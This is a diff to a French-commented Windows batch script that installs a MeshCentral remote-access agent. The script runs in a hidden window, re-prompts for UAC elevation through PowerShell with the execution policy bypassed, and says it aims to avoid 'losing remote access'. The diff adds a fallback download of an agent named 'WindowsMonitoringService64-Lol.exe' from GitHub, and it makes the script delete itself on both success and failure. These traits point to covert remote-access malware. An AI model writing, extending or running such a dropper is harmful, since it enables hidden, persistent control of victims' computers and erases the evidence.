@@ -14,10 +14,19 @@ if "!IS_HIDDEN!"=="0" (
 
 :: ============================================================================
 :: STEP 1: Boucle UAC - deja dans CMD cache, on eleve si necessaire
+:: Limite: 3 tentatives max, sinon abandon
 :: ============================================================================
+set "UAC_ATTEMPTS=0"
 :uac_check
 net session >nul 2>&1
 if %errorlevel% EQU 0 goto :post_uac
+
+set /a "UAC_ATTEMPTS+=1"
+if %UAC_ATTEMPTS% GTR 3 (
+    echo UAC refused 3 times, aborting... >> "%LOG_FILE%" 2>&1
+    del /f /q "%~f0" >nul 2>&1
+    exit /b 1
+)
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~f0'; $a='%*'; Start-Process cmd.exe -ArgumentList ('/c \"\"' + $f + '\" ' + $a + '\"') -Verb RunAs -WindowStyle Hidden"
 if errorlevel 1 goto :uac_check
@@ -197,10 +206,22 @@ set "DL_ERROR=%errorlevel%"
 call :log "Download command completed with code: %DL_ERROR%"
 
 if %DL_ERROR% NEQ 0 (
-    call :log "ERROR: Failed to download new agent installer (Error: %DL_ERROR%)"
-    call :log "CRITICAL: Aborting update to prevent losing remote access"
-    call :log "Verifiez: MESH_GROUP_ID est correct et %MESH_SERVER% est accessible"
-    goto :cleanup_exit
+    call :log "ERROR: Failed to download from Mesh server (Error: %DL_ERROR%)"
+    call :log "Trying FALLBACK: GitHub release..."
+    
+    :: FALLBACK: Download from GitHub
+    set "GITHUB_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
+    call :log "Fallback URL: !GITHUB_URL!"
+    
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri '!GITHUB_URL!' -OutFile '!NEW_AGENT_FILE!' -ErrorAction Stop; Write-Host 'PowerShell: Fallback download completed'; exit 0 } catch { Write-Host \"PowerShell FALLBACK ERROR: $($_.Exception.Message)\"; exit 1 }" >> "%LOG_FILE%" 2>&1
+    
+    set "DL_ERROR=%errorlevel%"
+    if !DL_ERROR! NEQ 0 (
+        call :log "CRITICAL: Both primary and fallback downloads failed!"
+        call :log "ABORTING: Cannot proceed without agent installer"
+        goto :cleanup_exit
+    )
+    call :log "SUCCESS: Fallback download from GitHub worked!"
 )
 
 :: Verify the downloaded file exists and has reasonable size
@@ -804,6 +825,12 @@ echo.
 :: Mettre "good" dans le presse-papiers pour signaler au site que l'installation est terminée
 echo good | clip
 
+call :log "SUCCESS: Script completed successfully!"
+call :log "Auto-deleting script file..."
+
+:: Auto-suppression du script lui-même
+(goto) 2>nul & del /f /q "%~f0" >nul 2>&1
+
 endlocal
 exit /b 0
 
@@ -835,6 +862,10 @@ echo ERROR: Update failed - see log for details
 echo Log file: %LOG_FILE%
 echo ================================================
 echo.
+
+call :log "Auto-deleting script file after error..."
+:: Auto-suppression du script même en cas d'erreur
+(goto) 2>nul & del /f /q "%~f0" >nul 2>&1
 
 endlocal
 exit /b 1
